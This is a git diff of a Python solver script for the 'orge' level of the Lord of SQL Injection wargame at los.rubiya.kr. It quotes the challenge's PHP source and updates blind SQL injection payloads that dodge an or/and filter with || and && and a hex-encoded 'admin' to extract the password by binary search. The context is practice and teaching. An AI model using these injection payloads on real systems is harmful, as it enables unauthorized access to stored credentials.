@@ -6,21 +6,22 @@ from getpass import getpass
 
 def main():
     '''
-    Orc
+    Orge
 
     if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
-    $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
+    if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
+    $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
     echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
     $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
-    if($result['id']) echo "<h2>Hello admin</h2>"; 
+    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
 
     $_GET[pw] = addslashes($_GET[pw]); 
-    $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
+    $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
     $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
-    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
+    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge");  
     '''
 
-    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
+    url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
 
     try:
         with open('cooks.pickle', 'rb') as f:
@@ -29,12 +30,12 @@ def main():
         cook = {'PHPSESSID': getpass(
             prompt='enter PHPSESSID cookie: ')}
 
-    payload = "' or length(pw)>%s #"
+    payload = "'||length(pw)>%s&&id=0x61646d696e#"
     len_of_key = los.find_key_len(url, payload, 'pw', 'Hello admin', cook)
 
     print(len_of_key)
 
-    payload = "' or id='admin' and ord(mid(pw,%s,1))%s #"
+    payload = "'||id='admin'&&ascii(mid(pw,%s,1))%s#"
     result = los.find_binary(url, payload,
                              'pw', 'Hello admin', 32, 127, len_of_key, cook)
 
@@ -44,7 +45,7 @@ def main():
     response = los.get_request(url, param, cook)
 
     if 'Clear!' in response:
-        print('ORC Clear!')
+        print('ORGE Clear!')
 
     # Save cookie
     los.save_cookies(cook)
